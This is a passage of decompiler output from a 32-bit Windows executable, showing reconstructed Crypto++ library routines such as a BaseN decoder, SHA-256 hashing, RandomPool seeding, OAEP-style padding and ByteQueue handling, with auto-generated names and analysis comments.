  result = (*(int (__thiscall **)(void *, char *, const int **, int))(*(_DWORD *)this + 4))(
             this,
             a3,
             &int const * `RTTI Type Descriptor',
             a4);
  if ( !(_BYTE)result )
  {
    v5 = (_BYTE **)sub_40AAE3((int)v12, a2);
    v14 = 0;
    v6 = (_BYTE **)sub_40BEFB((int)v11, v5, ": missing required parameter '");
    LOBYTE(v14) = 1;
    v7 = (_BYTE **)sub_40BEFB((int)v10, v6, a3);
    LOBYTE(v14) = 2;
    v8 = (_DWORD *)sub_40BEFB((int)v9, v7, "'");
    LOBYTE(v14) = 3;
    sub_406307(pExceptionObject, 1, v8);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 490628: using guessed type const int *int const * `RTTI Type Descriptor';
// 423C98: using guessed type char var_50[24];
// 423C98: using guessed type char var_68[24];
// 423C98: using guessed type char var_80[24];
// 423C98: using guessed type char var_98[24];

//----- (00423D30) --------------------------------------------------------
void *__thiscall sub_423D30(_DWORD *this, void *a2)
{
  int v3; // esi
  int v4; // edx
  int pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+38h] [ebp-28h] BYREF

  sub_423C98(a2, "BaseN_Decoder", "DecodingLookupArray", (int)(this + 6));
  sub_41DAC1(a2, "BaseN_Decoder", "Log2Base", (int)(this + 8));
  v3 = this[8];
  if ( v3 <= 0 || v3 >= 8 )
  {
    sub_40AAE3((int)Src, "BaseN_Decoder: Log2Base must be between 1 and 7 inclusive");
    Src[9] = 0;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  this[11] = 0;
  v4 = v3;
  this[10] = 0;
  if ( (v3 & 0x80000007) != 0 )
  {
    do
      v4 += v3;
    while ( v4 % 8 );
  }
  this[9] = v4 / 8;
  return sub_40898B((int)(this + 12), v4 / 8);
}
// 423D87: conditional instruction was optimized away because esi.4 is in (1..7)
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (00423DF7) --------------------------------------------------------
int __thiscall sub_423DF7(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  int v6; // ebx
  unsigned int v7; // edx
  int v8; // ebp
  int v9; // eax
  unsigned int v11; // [esp+10h] [ebp-4h]

  v6 = 1;
  switch ( this[5] )
  {
    case 0:
      this[4] = 0;
      goto LABEL_6;
    case 1:
LABEL_19:
      if ( sub_41E5B7(this, 1, this[15], this[9], 0, a5, (int)dword_48C11C) )
      {
        if ( (unsigned int)(this[9] - this[4]) > 1 )
          return this[9] - this[4];
        return v6;
      }
      this[11] = 0;
      this[10] = 0;
LABEL_6:
      while ( 1 )
      {
        v7 = this[4];
        if ( v7 >= a3 )
          break;
        v11 = *(_DWORD *)(this[6] + 4 * *(unsigned __int8 *)(v7 + a2));
        this[4] = v7 + 1;
        if ( v11 < 0x100 )
        {
          if ( !this[10] && !this[11] )
            memset((void *)this[15], 0, this[9]);
          v8 = this[11] + this[8];
          if ( v8 > 8 )
          {
            *(_BYTE *)(this[15] + this[10]) |= v11 >> (v8 - 8);
            *(_BYTE *)(this[15] + this[10] + 1) |= (_BYTE)v11 << (16 - v8);
          }
          else
          {
            *(_BYTE *)(this[15] + this[10]) |= (_BYTE)v11 << (8 - v8);
          }
          this[11] = v8;
          if ( v8 >= 8 )
          {
            v9 = this[10];
            do
            {
              v8 -= 8;
              ++v9;
            }
            while ( v8 >= 8 );
            this[10] = v9;
            this[11] = v8;
          }
          if ( this[10] == this[9] )
            goto LABEL_19;
        }
      }
      if ( !a4 )
        return 0;
      break;
    case 2:
      break;
    default:
      return 0;
  }
  if ( sub_41E5B7(this, 2, this[15], this[10], a4, a5, (int)dword_48C11C) )
  {
    if ( (unsigned int)(this[10] - this[4]) > 1 )
      return this[10] - this[4];
    return v6;
  }
  this[11] = 0;
  this[10] = 0;
  return 0;
}
// 48C11C: using guessed type _DWORD dword_48C11C[6];

//----- (00423F56) --------------------------------------------------------
std::exception *__thiscall sub_423F56(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::HashInputTooLong::`vftable';
  return this;
}
// 46DF80: using guessed type void *CryptoPP::HashInputTooLong::`vftable';

//----- (00423F77) --------------------------------------------------------
_DWORD *__thiscall sub_423F77(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v5[10]; // [esp+14h] [ebp-28h] BYREF

  v3 = sub_40C8F6(v5, "IteratedHashBase: input data exceeds maximum allowed by hash function ", a2);
  v5[9] = 0;
  sub_406307(this, 4, v3);
  *this = &CryptoPP::InvalidDataFormat::`vftable';
  sub_40BAFC(v5, 1, 0);
  *this = &CryptoPP::HashInputTooLong::`vftable';
  return this;
}
// 46C434: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';
// 46DF80: using guessed type void *CryptoPP::HashInputTooLong::`vftable';

//----- (00423FCD) --------------------------------------------------------
int __thiscall sub_423FCD(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  int v4; // esi
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v3 = (*(int (__thiscall **)(_DWORD *))(*this + 32))(this);
  v6 = v3;
  v4 = sub_40A9BF(this + 1, &v6);
  *a2 = v3 - v4;
  return v4 + (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (0042400A) --------------------------------------------------------
void *__thiscall sub_42400A(_DWORD *this, size_t Size, char a3)
{
  int v4; // esi
  int v5; // eax
  void *v6; // ebp
  size_t v7; // esi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+10h] [ebp-8h] BYREF
  int v12; // [esp+14h] [ebp-4h]

  v12 = (*(int (__thiscall **)(_DWORD *))(*this + 32))(this);
  v11 = v12;
  v4 = sub_40A9BF(this + 1, &v11);
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
  v6 = (void *)v5;
  *(_BYTE *)(v4 + v5) = a3;
  v7 = v4 + 1;
  if ( v7 <= Size )
    return memset((void *)(v7 + v5), 0, Size - v7);
  memset((void *)(v7 + v5), 0, v12 - v7);
  v9 = *this;
  v10 = (*(int (__thiscall **)(_DWORD *))(*this + 32))(this);
  (*(void (__thiscall **)(_DWORD *, void *, int))(v9 + 84))(this, v6, v10);
  return memset(v6, 0, Size);
}

//----- (0042408D) --------------------------------------------------------
int __thiscall sub_42408D(_DWORD *this)
{
  this[2] = 0;
  this[1] = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 72))(this);
}

//----- (0042409A) --------------------------------------------------------
int __thiscall sub_42409A(int *this, _DWORD *Destination, size_t Size)
{
  _DWORD *v4; // ebp
  unsigned int v5; // esi
  int v6; // ebx
  unsigned int v7; // ecx
  unsigned int v8; // esi
  unsigned int v9; // eax
  int v10; // esi
  int v11; // eax
  rsize_t v12; // eax
  int v14; // [esp+10h] [ebp-4h]

  sub_40DEDE(this, Size);
  v14 = (*(int (__thiscall **)(int *))(*this + 88))(this);
  v4 = (_DWORD *)(*(int (__thiscall **)(int *))(*this + 92))(this);
  v5 = (*(int (__thiscall **)(int *))(*this + 32))(this);
  v6 = (*(int (__thiscall **)(int *))(*this + 76))(this);
  sub_42400A(this, v5 - 8, 128);
  v7 = 8 * this[1];
  if ( v6 )
    v7 = _byteswap_ulong(v7);
  v8 = v5 >> 2;
  *(_DWORD *)(v14 + 4 * (v8 + v6) - 8) = v7;
  v9 = ((unsigned int)this[1] >> 29) + 8 * this[2];
  if ( v6 )
    v9 = _byteswap_ulong(v9);
  *(_DWORD *)(v14 + 4 * (v8 - v6) - 4) = v9;
  v10 = *this;
  v11 = (*(int (__thiscall **)(int *))(*this + 32))(this);
  (*(void (__thiscall **)(int *, int, int))(v10 + 84))(this, v14, v11);
  if ( !sub_40BDCB((unsigned int)Destination, 4u) || (Size & 3) != 0 )
  {
    v12 = (*(int (__thiscall **)(int *))(*this + 28))(this);
    sub_41F2B3(v6, v4, v4, v12);
    memmove_0(Destination, v4, Size);
  }
  else
  {
    sub_41F2B3(v6, Destination, v4, Size);
  }
  return (*(int (__thiscall **)(int *))(*this + 24))(this);
}

//----- (0042417F) --------------------------------------------------------
char *__thiscall sub_42417F(_DWORD *this, char *Src, char *a3)
{
  unsigned int v4; // esi
  char *v5; // edi
  unsigned int v6; // edx
  int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // eax
  char *v10; // esi
  char *result; // eax
  int v12; // esi
  int v13; // eax
  size_t v14; // ecx
  int v15; // esi
  int v16; // eax
  int v17; // eax
  size_t v18; // eax
  int v19; // esi
  int v20; // eax
  _DWORD *v21; // eax
  int v22; // [esp+10h] [ebp-60h]
  size_t v23; // [esp+14h] [ebp-5Ch]
  char *v24; // [esp+18h] [ebp-58h]
  size_t Size; // [esp+1Ch] [ebp-54h]
  char v26[24]; // [esp+20h] [ebp-50h] BYREF
  _DWORD pExceptionObject[14]; // [esp+38h] [ebp-38h] BYREF

  v4 = this[1];
  v5 = Src;
  v6 = this[2];
  Size = (size_t)a3;
  this[1] = &a3[v4];
  if ( (unsigned int)&a3[v4] < v4 )
    this[2] = v6 + 1;
  v7 = *this;
  if ( this[2] < v6 )
  {
    v21 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, char *))(v7 + 8))(this, v26);
    pExceptionObject[13] = 0;
    sub_423F77(pExceptionObject, v21);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVHashInputTooLong_CryptoPP__);
  }
  v8 = (*(int (__thiscall **)(_DWORD *))(v7 + 32))(this);
  v23 = v8;
  if ( v8 <= 1 )
    v9 = 0;
  else
    v9 = v8 - 1;
  v22 = v4 & v9;
  v10 = (char *)(*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
  v24 = v10;
  if ( v22 )
  {
    result = a3;
    if ( (unsigned int)&a3[v22] < v23 )
    {
      if ( v10 && Src && a3 )
        return (char *)memmove_0(&v10[v22], Src, (size_t)a3);
      return result;
    }
    if ( v10 && Src )
      memmove_0(&v10[v22], Src, v23 - v22);
    v12 = *this;
    v13 = (*(int (__thiscall **)(_DWORD *))(*this + 32))(this);
    (*(void (__thiscall **)(_DWORD *, char *, int))(v12 + 84))(this, v24, v13);
    v5 = &Src[v23 - v22];
    v10 = v24;
    v14 = (size_t)&a3[v22 - v23];
    Size = v14;
  }
  else
  {
    v14 = (size_t)a3;
  }
  if ( v14 >= v23 )
  {
    if ( v5 == v10 )
    {
      v15 = *this;
      v16 = (*(int (__thiscall **)(_DWORD *))(*this + 32))(this);
      return (char *)(*(int (__thiscall **)(_DWORD *, char *, int))(v15 + 84))(this, v24, v16);
    }
    if ( sub_40BDCB((unsigned int)v5, 4u) )
    {
      v17 = (*(int (__thiscall **)(_DWORD *, char *, size_t))(*this + 84))(this, v5, Size);
      v5 += Size - v17;
      v14 = v17;
    }
    else
    {
      v18 = v23;
      while ( 1 )
      {
        if ( v10 && v5 )
          memmove_0(v10, v5, v18);
        v19 = *this;
        v20 = (*(int (__thiscall **)(_DWORD *))(*this + 32))(this);
        (*(void (__thiscall **)(_DWORD *, char *, int))(v19 + 84))(this, v24, v20);
        v18 = v23;
        v5 += v23;
        v14 = Size - v23;
        Size = v14;
        if ( v14 < v23 )
          break;
        v10 = v24;
      }
    }
  }
  result = v24;
  if ( v24 && v5 && v14 && v24 != v5 )
    return (char *)memmove_0(v24, v5, v14);
  return result;
}
// 42417F: using guessed type char var_50[24];

//----- (00424325) --------------------------------------------------------
int __thiscall sub_424325(int this)
{
  int v2; // edx

  sub_409462((_DWORD *)this);
  sub_42441F(this + 104, v2, 0x10u);
  sub_420F71(*(void **)(this + 192));
  return this;
}
// 424344: variable 'v2' is possibly undefined

//----- (00424361) --------------------------------------------------------
_DWORD *__thiscall sub_424361(_DWORD *this, int a2)
{
  int v3; // edx

  sub_408CC4(this, a2);
  sub_4243D1((int)(this + 26), v3, a2 + 104);
  return this;
}
// 42437C: variable 'v3' is possibly undefined

//----- (0042438B) --------------------------------------------------------
int __fastcall sub_42438B(int a1, int a2, unsigned int a3)
{
  *(_BYTE *)(a1 + 25) = 0;
  *(_DWORD *)(a1 + 32) = -1;
  *(_DWORD *)(a1 + 36) = a3;
  *(_DWORD *)(a1 + 40) = sub_424747(a1, a2, a3, 0);
  return a1;
}

//----- (004243AE) --------------------------------------------------------
int __fastcall sub_4243AE(int a1, int a2, unsigned int a3)
{
  *(_BYTE *)(a1 + 41) = 0;
  *(_DWORD *)(a1 + 48) = -1;
  *(_DWORD *)(a1 + 52) = a3;
  *(_DWORD *)(a1 + 56) = sub_424768(a1, a2, a3, 0);
  return a1;
}

//----- (004243D1) --------------------------------------------------------
int __fastcall sub_4243D1(int a1, int a2, int a3)
{
  void *v4; // edx

  *(_BYTE *)(a1 + 73) = 0;
  *(_DWORD *)(a1 + 80) = *(_DWORD *)(a3 + 80);
  *(_DWORD *)(a1 + 84) = *(_DWORD *)(a3 + 84);
  v4 = (void *)sub_424789(a1, a2, *(_DWORD *)(a3 + 84), 0);
  *(_DWORD *)(a1 + 88) = v4;
  if ( *(_DWORD *)(a3 + 88) )
    memcpy_s(v4, 4 * *(_DWORD *)(a1 + 84), *(const void *const *)(a3 + 88), 4 * *(_DWORD *)(a3 + 84));
  return a1;
}

//----- (0042441F) --------------------------------------------------------
int __fastcall sub_42441F(int a1, int a2, unsigned int a3)
{
  *(_BYTE *)(a1 + 73) = 0;
  *(_DWORD *)(a1 + 80) = 0x3FFFFFFF;
  *(_DWORD *)(a1 + 84) = a3;
  *(_DWORD *)(a1 + 88) = sub_424789(a1, a2, a3, 0);
  return a1;
}

//----- (00424445) --------------------------------------------------------
_DWORD *__thiscall sub_424445(_DWORD *this)
{
  int v2; // edx
  int v3; // edx
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  size_t v7; // [esp-4h] [ebp-28h]

  sub_40CAC3(this, 1);
  *this = &CryptoPP::RandomPool::`vftable';
  sub_42438B((int)(this + 2), v2, 0x10u);
  sub_4243AE((int)(this + 14), v3, 0x20u);
  v4 = operator new(0x130u);
  if ( v4 )
    v5 = sub_409102(v4);
  else
    v5 = 0;
  this[30] = v5;
  v7 = this[27];
  *((_BYTE *)this + 124) = 0;
  memset((void *)this[28], 0, v7);
  memset((void *)this[12], 0, this[11]);
  return this;
}
// 424468: variable 'v2' is possibly undefined
// 424477: variable 'v3' is possibly undefined
// 46DFD4: using guessed type void *CryptoPP::RandomPool::`vftable';

//----- (004244CF) --------------------------------------------------------
void *__fastcall sub_4244CF(int a1, int a2)
{
  return sub_4247AA(
           a1,
           a2,
           *(void **)(a1 + 88),
           *(_DWORD *)((*(_DWORD *)(a1 + 80) < *(_DWORD *)(a1 + 84) ? 0xFFFFFFFC : 0) + a1 + 84));
}

//----- (004244FB) --------------------------------------------------------
_DWORD *__thiscall sub_4244FB(_DWORD *Block, char a2)
{
  sub_4071E4(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0042451D) --------------------------------------------------------
void *__fastcall sub_42451D(void *Block, int a2, char a3)
{
  sub_4244CF((int)Block + 104, a2);
  sub_409166((int)Block + 16);
  if ( (a3 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0042454A) --------------------------------------------------------
int __stdcall sub_42454A(int a1)
{
  sub_40AAE3(a1, "SHA-256");
  return a1;
}

//----- (00424568) --------------------------------------------------------
_DWORD *__thiscall sub_424568(void *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi

  v2 = operator new(0xC8u);
  v3 = v2;
  if ( !v2 )
    return 0;
  sub_424361(v2, (int)this);
  *v3 = &CryptoPP::SHA256::`vftable';
  return v3;
}
// 46E004: using guessed type void *CryptoPP::SHA256::`vftable';

//----- (0042459A) --------------------------------------------------------
void __userpurge sub_42459A(int a1@<ecx>, int a2@<ebp>, int a3, int a4, unsigned int a5, unsigned int a6)
{
  unsigned int v6; // ebx
  unsigned int v8; // edi
  __time64_t v9; // rax
  int v10; // ebp

  v6 = a6;
  v8 = a5;
  if ( a6 || a5 )
  {
    if ( !*(_BYTE *)(a1 + 124) )
      (*(void (__thiscall **)(_DWORD, _DWORD, int, int (__thiscall ***)(void *, char)))(**(_DWORD **)(a1 + 120) + 24))(
        *(_DWORD *)(a1 + 120),
        *(_DWORD *)(a1 + 112),
        32,
        off_48C184);
    *(_QWORD *)*(_DWORD *)(a1 + 48) += sub_42946A().QuadPart;
    v9 = _time64(0);
    *(_QWORD *)(*(_DWORD *)(a1 + 48) + 8) += v9;
    do
    {
      (*(void (__thiscall **)(int, _DWORD, _DWORD, _DWORD, int))(*(_DWORD *)(*(_DWORD *)(a1 + 120) + 4) + 12))(
        *(_DWORD *)(a1 + 120) + 4,
        *(_DWORD *)(a1 + 48),
        0,
        *(_DWORD *)(a1 + 48),
        a2);
      if ( v6 || v8 >= 0x10 )
        v10 = 16;
      else
        v10 = v8;
      a2 = 1;
      (*(void (__thiscall **)(int, _DWORD, _DWORD, int, _DWORD))(*(_DWORD *)a4 + 136))(
        a4,
        0,
        *(_DWORD *)(a1 + 48),
        v10,
        0);
      v6 = (__PAIR64__(v6, v8) - (unsigned int)v10) >> 32;
      v8 -= v10;
    }
    while ( __PAIR64__(v6, v8) );
  }
}
// 42459A: could not find valid save-restore pair for ebp
// 48C184: using guessed type int (__thiscall ***off_48C184)(void *Block, char);

//----- (00424686) --------------------------------------------------------
__m128i *__thiscall sub_424686(_DWORD **this, unsigned int *a2)
{
  return sub_423C75(this[48], a2);
}

//----- (0042469A) --------------------------------------------------------
#error "4246FD: call analysis failed (funcsize=36)"

//----- (00424733) --------------------------------------------------------
void __thiscall sub_424733(void **this)
{
  sub_420F71(this[48]);
}

//----- (00424740) --------------------------------------------------------
int __thiscall sub_424740(_DWORD *this)
{
  return this[48];
}

//----- (00424747) --------------------------------------------------------
int __fastcall sub_424747(int a1, int a2, unsigned int a3, int a4)
{
  if ( a3 > 0x10 || *(_BYTE *)(a1 + 25) )
    return 0;
  *(_BYTE *)(a1 + 25) = 1;
  return a1 + (-a1 & 0xF);
}

//----- (00424768) --------------------------------------------------------
int __fastcall sub_424768(int a1, int a2, unsigned int a3, int a4)
{
  if ( a3 > 0x20 || *(_BYTE *)(a1 + 41) )
    return 0;
  *(_BYTE *)(a1 + 41) = 1;
  return a1 + (-a1 & 0xF);
}

//----- (00424789) --------------------------------------------------------
int __fastcall sub_424789(int a1, int a2, unsigned int a3, int a4)
{
  if ( a3 > 0x10 || *(_BYTE *)(a1 + 73) )
    return 0;
  *(_BYTE *)(a1 + 73) = 1;
  return a1 + (-a1 & 0xF);
}

//----- (004247AA) --------------------------------------------------------
void *__fastcall sub_4247AA(int a1, int a2, void *a3, int a4)
{
  void *result; // eax

  result = (void *)(a1 + (-a1 & 0xF));
  if ( a3 == result )
  {
    *(_BYTE *)(a1 + 73) = 0;
    result = 0;
    memset(a3, 0, 4 * a4);
  }
  return result;
}

//----- (004247CC) --------------------------------------------------------
void *__cdecl sub_4247CC(void *Buf, int a2, _DWORD *a3)
{
  int v4; // esi
  void *v5; // eax

  if ( !sub_424809((int)Buf, a3) )
    return (void *)a2;
  v4 = a2;
  v5 = memchr(Buf, *(unsigned __int8 *)a3, a2 - (_DWORD)Buf);
  if ( v5 )
    return v5;
  return (void *)v4;
}

//----- (00424809) --------------------------------------------------------
bool __cdecl sub_424809(int a1, _DWORD *a2)
{
  return *a2 <= 0xFFu;
}

//----- (00424820) --------------------------------------------------------
int __thiscall sub_424820(int this, void *Source, rsize_t SourceSize)
{
  void *v4; // eax

  *(_DWORD *)(this + 4) = -1;
  *(_DWORD *)(this + 8) = SourceSize;
  if ( SourceSize )
    v4 = sub_420BF0(SourceSize);
  else
    v4 = 0;
  *(_DWORD *)(this + 12) = v4;
  if ( Source && v4 )
  {
    memcpy_s(v4, *(_DWORD *)(this + 8), Source, SourceSize);
  }
  else if ( *(_DWORD *)(this + 8) )
  {
    memset(v4, 0, *(_DWORD *)(this + 8));
  }
  return this;
}

//----- (00424883) --------------------------------------------------------
int __thiscall sub_424883(void *this, unsigned int a2)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  return 2 * v2 + 1 < a2 >> 3 ? (a2 >> 3) - (2 * v2 + 1) : 0;
}

//----- (004248A3) --------------------------------------------------------
int __thiscall sub_4248A3(void *this, int a2, void *Src, size_t Size, _BYTE *a5, unsigned int a6, int *a7)
{
  _BYTE *v7; // ebx
  int v8; // edi
  int v9; // eax
  int v10; // esi
  _BYTE *v11; // ebx
  int v12; // eax
  int v13; // edx
  int v14; // ecx
  int v15; // eax
  char *v17; // [esp-18h] [ebp-5Ch]
  int v18[3]; // [esp+10h] [ebp-34h] BYREF
  _DWORD v19[5]; // [esp+1Ch] [ebp-28h] BYREF
  void *v20; // [esp+30h] [ebp-14h]
  int v21; // [esp+34h] [ebp-10h]
  int v22; // [esp+40h] [ebp-4h]
  size_t Sizea; // [esp+54h] [ebp+10h]
  int v24; // [esp+58h] [ebp+14h]
  int v25; // [esp+5Ch] [ebp+18h]

  v20 = this;
  v7 = a5;
  if ( (a6 & 7) != 0 )
  {
    *a5 = 0;
    v7 = a5 + 1;
  }
  v24 = (int)v7;
  v8 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this);
  v19[4] = v8;
  v9 = *(_DWORD *)v8;
  v22 = 0;
  v10 = (*(int (__thiscall **)(int))(v9 + 28))(v8);
  v25 = (a6 >> 3) - v10;
  v11 = &v7[v10];
  v21 = v10;
  sub_406A26(v18, 0, 0);
  v12 = *a7;
  LOBYTE(v22) = 1;
  (*(void (__thiscall **)(int *, const char *, void *, int *))(v12 + 4))(
    a7,
    "EncodingParameters",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v18);
  v13 = v18[2];
  if ( LOBYTE(v18[0]) )
    v13 = v19[2];
  v14 = v18[1];
  if ( LOBYTE(v18[0]) )
    v14 = v19[3];
  (*(void (__thiscall **)(int, _BYTE *, int, int))(*(_DWORD *)v8 + 44))(v8, v11, v14, v13);
  memset(&v11[v10], 0, v25 - v10 - Size - 1);
  v17 = &v11[v25 - Size];
  *(v17 - 1) = 1;
  memmove_0(v17, Src, Size);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a2 + 32))(a2, v24, v10);
  Sizea = (*(int (__thiscall **)(void *))(*(_DWORD *)v20 + 28))(v20);
  v15 = *(_DWORD *)Sizea;
  LOBYTE(v22) = 2;
  (*(void (__thiscall **)(size_t, int, _BYTE *, int, int, int, int))(v15 + 4))(Sizea, v8, v11, v25, v24, v21, 1);
  (*(void (__thiscall **)(size_t, int, int, int, _BYTE *, int, int))(*(_DWORD *)Sizea + 4))(
    Sizea,
    v8,
    v24,
    v21,
    v11,
    v25,
    1);
  (**(void (__thiscall ***)(size_t, int))Sizea)(Sizea, 1);
  sub_4089EF(v19);
  return (**(int (__thiscall ***)(int, int))v8)(v8, 1);
}

//----- (004249C0) --------------------------------------------------------
int __thiscall sub_4249C0(_BYTE *this, int a2, char *Source, unsigned int a4, void *a5, int Src)
{
  char *v6; // edi
  unsigned int v7; // ebx
  int v8; // esi
  void (__thiscall **v9)(_DWORD, _DWORD); // eax
  int v10; // ebx
  int v11; // eax
  int v12; // edi
  int v13; // eax
  int v14; // ebx
  int v15; // eax
  void *v16; // ebx
  bool v17; // zf
  _BYTE *v18; // ebx
  int v19; // edx
  int v20; // ecx
  size_t v21; // ebx
  int v23; // [esp-Ch] [ebp-70h]
  int v24[3]; // [esp+10h] [ebp-54h] BYREF
  _DWORD v25[4]; // [esp+1Ch] [ebp-48h] BYREF
  _DWORD v26[3]; // [esp+2Ch] [ebp-38h] BYREF
  int v27; // [esp+38h] [ebp-2Ch]
  int v28; // [esp+3Ch] [ebp-28h]
  int v29; // [esp+40h] [ebp-24h]
  _BYTE *v30; // [esp+44h] [ebp-20h]
  _BYTE *v31; // [esp+48h] [ebp-1Ch] BYREF
  int v32; // [esp+4Ch] [ebp-18h]
  int v33; // [esp+50h] [ebp-14h]
  bool v34; // [esp+57h] [ebp-Dh]
  int v35; // [esp+60h] [ebp-4h]
  char Source_3; // [esp+73h] [ebp+Fh]
  char Source_3a; // [esp+73h] [ebp+Fh]
  char Source_3b; // [esp+73h] [ebp+Fh]

  v31 = this;
  v6 = Source;
  v34 = 0;
  if ( (a4 & 7) != 0 )
  {
    v34 = *Source != 0;
    v6 = Source + 1;
  }
  v7 = a4 >> 3;
  v8 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 24))(this);
  v29 = v8;
  v9 = *(void (__thiscall ***)(_DWORD, _DWORD))v8;
  v35 = 0;
  a4 = ((int (__thiscall *)(int))v9[7])(v8);
  v32 = v7 - a4;
  if ( v7 < 2 * a4 + 1 || (Source_3 = 0, v34) )
    Source_3 = 1;
  sub_424820((int)v26, v6, v7);
  v10 = v27;
  v33 = v27 + a4;
  v11 = *(_DWORD *)v31;
  LOBYTE(v35) = 1;
  v12 = (*(int (__thiscall **)(_BYTE *))(v11 + 28))(v31);
  v28 = v12;
  v13 = *(_DWORD *)v12;
  LOBYTE(v35) = 2;
  (*(void (__thiscall **)(int, int, int, unsigned int, int, int, int))(v13 + 4))(v12, v8, v10, a4, v33, v32, 1);
  v23 = v10;
  v14 = v32;
  (*(void (__thiscall **)(int, int, int, int, int, unsigned int, int))(*(_DWORD *)v12 + 4))(
    v12,
    v8,
    v33,
    v32,
    v23,
    a4,
    1);
  sub_406A26(v24, 0, 0);
  v15 = *(_DWORD *)Src;
  LOBYTE(v35) = 3;
  (*(void (__thiscall **)(int, const char *, void *, int *))(v15 + 4))(
    Src,
    "EncodingParameters",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v24);
  v16 = (void *)(v33 + v14);
  Src = 1;
  v30 = (_BYTE *)(a4 + v33);
  Src = (int)sub_4247CC((void *)(a4 + v33), (int)v16, &Src);
  if ( (void *)Src == v16 || (v17 = Source_3 == 0, Source_3a = 0, !v17) )
    Source_3a = 1;
  v18 = (_BYTE *)Src;
  v31 = (char *)&a4 + 3;
  HIBYTE(a4) = 0;
  if ( sub_41D36F(v30, (_BYTE *)Src, &v31) != v18 || (v17 = Source_3a == 0, Source_3b = 0, !v17) )
    Source_3b = 1;
  v19 = v24[2];
  if ( LOBYTE(v24[0]) )
    v19 = v25[2];
  v20 = v24[1];
  if ( LOBYTE(v24[0]) )
    v20 = v25[3];
  if ( !(*(unsigned __int8 (__thiscall **)(int, int, int, int))(*(_DWORD *)v8 + 52))(v8, v33, v20, v19) || Source_3b )
  {
    *(_DWORD *)(a2 + 4) = 0;
    *(_BYTE *)a2 = 0;
    sub_4089EF(v25);
    (**(void (__thiscall ***)(int, int))v12)(v12, 1);
    sub_4089EF(v26);
    (**(void (__thiscall ***)(int, int))v8)(v8, 1);
    return a2;
  }
  else
  {
    Src = (int)(v18 + 1);
    v21 = v33 - (_DWORD)(v18 + 1) + v32;
    memmove_0(a5, (const void *)Src, v21);
    *(_BYTE *)a2 = 1;
    *(_DWORD *)(a2 + 4) = v21;
    sub_4089EF(v25);
    (**(void (__thiscall ***)(int, int))v12)(v12, 1);
    sub_4089EF(v26);
    (**(void (__thiscall ***)(int, int))v8)(v8, 1);
    return a2;
  }
}
// 4249C0: using guessed type _DWORD var_38[3];

//----- (00424BAD) --------------------------------------------------------
_DWORD *__thiscall sub_424BAD(_DWORD *this, int a2)
{
  _DWORD *v3; // ebx
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *result; // eax

  v3 = 0;
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  sub_40CAC3(this, 0);
  v4 = a2;
  *this = &CryptoPP::ByteQueue::`vftable';
  this[1] = &CryptoPP::ByteQueue::`vftable';
  this[5] = 0;
  this[6] = 0;
  if ( !a2 )
    v4 = 256;
  this[7] = 0;
  this[8] = 0;
  *((_BYTE *)this + 36) = 0;
  *((_BYTE *)this + 12) = a2 == 0;
  this[4] = v4;
  v5 = operator new(0x1Cu);
  if ( v5 )
    v3 = sub_424C2C(v5, this[4]);
  this[6] = v3;
  result = this;
  this[5] = v3;
  return result;
}
// 46E0E8: using guessed type void *CryptoPP::ByteQueue::`vftable';
// 46E19C: using guessed type void *CryptoPP::ByteQueue::`vftable';

//----- (00424C2C) --------------------------------------------------------
_DWORD *__thiscall sub_424C2C(_DWORD *this, size_t Size)
{
  sub_408A33(this + 1, Size);
  this[6] = 0;
  this[5] = 0;
  *this = 0;
  return this;
}

//----- (00424C54) --------------------------------------------------------
_DWORD *__thiscall sub_424C54(_DWORD *this, _DWORD *a2)
{
  this[2] = a2[2];
  *this = &CryptoPP::ByteQueue::Walker::`vftable';
  this[1] = &CryptoPP::ByteQueue::Walker::`vftable';
  this[3] = a2[3];
  this[4] = a2[4];
  this[6] = a2[6];
  this[7] = a2[7];
  this[8] = a2[8];
  this[9] = a2[9];
  this[10] = a2[10];
  return this;
}
// 46B4D0: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 46B584: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';

//----- (00424C9A) --------------------------------------------------------
void __thiscall sub_424C9A(_DWORD *this)
{
  _DWORD *v1; // edi
  _DWORD *v2; // esi

  *this = &CryptoPP::ByteQueue::`vftable';
  this[1] = &CryptoPP::ByteQueue::`vftable';
  v1 = (_DWORD *)this[5];
  if ( v1 )
  {
    do
    {
